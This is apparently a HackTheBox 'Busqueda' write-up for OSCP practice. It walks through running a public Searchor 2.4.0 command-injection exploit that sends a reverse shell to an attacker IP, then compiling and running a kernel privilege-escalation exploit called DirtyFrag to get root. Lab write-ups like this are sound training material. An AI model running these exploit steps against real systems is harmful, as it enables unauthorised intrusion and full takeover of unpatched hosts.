+++
date = '2026-05-15T00:00:00-03:00'
draft = false
title = 'HTB: Busqueda - OSCP Prep Write-up'
tags = ['htb', 'oscp', 'lain-kusanagi', 'write-up', 'linux', 'searchor', 'command-injection', 'kernel-exploit', 'dirtyfrag']
description = 'Write-up for HackTheBox machine Busqueda - version disclosure leads to a Searchor 2.4.0 command injection exploit for foothold, then a Linux kernel exploit (DirtyFrag) for root.'
ShowToc = true
TocOpen = false

[cover]
image = 'images/htb-busqueda/cover.png'
+++

Version numbers in page footers exist for a reason. Searchor 2.4.0 handed over the foothold; a kernel exploit closed it out.

## Machine info

| | |
|---|---|
| **Name** | Busqueda |
| **Platform** | HackTheBox |
| **OS** | Linux |
| **Difficulty** | Easy |

## TL;DR

- Nmap reveals a web app on port 80 - the page footer discloses "Powered by Flask and Searchor 2.4.0"
- Searchor 2.4.0 is vulnerable to arbitrary command injection; a public exploit delivers a reverse shell as `svc`
- Privilege escalation via DirtyFrag (universal Linux LPE): compile and run the PoC to get root

---

## Recon

### Add host to /etc/hosts

![Adding searcher.htb to /etc/hosts](/images/htb-busqueda/hosts.png)

```bash
echo "10.129.33.105 searcher.htb" >> /etc/hosts
```

### Port scan

![Nmap results](/images/htb-busqueda/nmap.png)

```bash
nmap -sV -sC -Pn -A 10.129.33.105
```

Open ports: **22** (SSH, OpenSSH 8.9p1 Ubuntu) and **80** (HTTP, Apache 2.4.52).

---

## Enumeration

### Version disclosure

Visiting `http://searcher.htb` reveals a search aggregator web app. The page footer discloses the technology stack:

![Website footer showing Searchor 2.4.0](/images/htb-busqueda/website-version.png)

**Searchor 2.4.0** - a quick search for known vulnerabilities turns up a public command injection exploit.

---

## Foothold

### Searchor 2.4.0 - Arbitrary Command Injection

Searchor <= 2.4.2 is vulnerable to arbitrary command injection. The `eval()` call in the search function is not sanitized, allowing an attacker to inject Python code via the search query parameter.

Clone the exploit:

```bash
git clone https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection
```

Run it with the target and attacker details:

![Running exploit and receiving shell as svc](/images/htb-busqueda/foothold-shell.png)

```bash
./exploit.sh searcher.htb 10.10.14.208
```

Shell lands as `svc`. Grab the user flag:

![User flag](/images/htb-busqueda/user-flag.png)

---

## Privilege Escalation

### DirtyFrag - Universal Linux LPE

DirtyFrag is a newly discovered local privilege escalation exploit that stands out for one reason: it's been dubbed **universal**. Unlike most kernel exploits that require a specific kernel version, distro configuration, or enabled module, DirtyFrag works across a broad range of unpatched Linux kernels without any special preconditions - no `CONFIG_USER_NS`, no specific filesystem, no particular hardware.

The vulnerability targets a memory corruption bug in the Linux kernel's IP fragment reassembly path. When the kernel reassembles fragmented IP packets, a flaw in how it manages fragment queue memory allows an unprivileged user to trigger a use-after-free condition. By carefully timing and shaping the heap, an attacker can corrupt kernel memory structures - specifically credential objects - and overwrite the UID/GID of their own process to zero, escalating to root without ever touching userland SUID binaries or sudo.

What makes it particularly dangerous in real environments is the low barrier: it runs as a normal user, requires no network access, produces no obvious log noise, and compiles from a single C file.

Clone the exploit:

```bash
git clone https://github.com/V4bel/dirtyfrag
cd dirtyfrag
```

Compile and run on the target:

![DirtyFrag giving root shell](/images/htb-busqueda/root-shell.png)

```bash
gcc -O0 -Wall -o exp exp.c -lutil && ./exp
id
# uid=0(root) gid=0(root) groups=0(root)
```

**Root!**

---

## Takeaways (for OSCP)

- **Page footers and "Powered by" strings are free version disclosures.** Always read the full page source - technology stack and version info often appear in footers, comments, or HTTP response headers.
- **`eval()` without sanitization is an injection vector.** Searchor's bug is a Python `eval()` call on user input; any language that dynamically evaluates user-controlled strings is a target.
- **DirtyFrag is "universal" for a reason.** No special kernel config, no required modules, no specific distro - it works on a wide range of unpatched kernels. Keep it in your toolkit; if the kernel is behind on patches, this is often the fastest path to root with minimal noise.

## References

- [HackTheBox - Busqueda](https://app.hackthebox.com/machines/Busqueda)
- [Searchor 2.4.0 Exploit - nikn0laty](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection)
- [DirtyFrag - V4bel](https://github.com/V4bel/dirtyfrag)
- Lain Kusanagi list (OSCP prep)
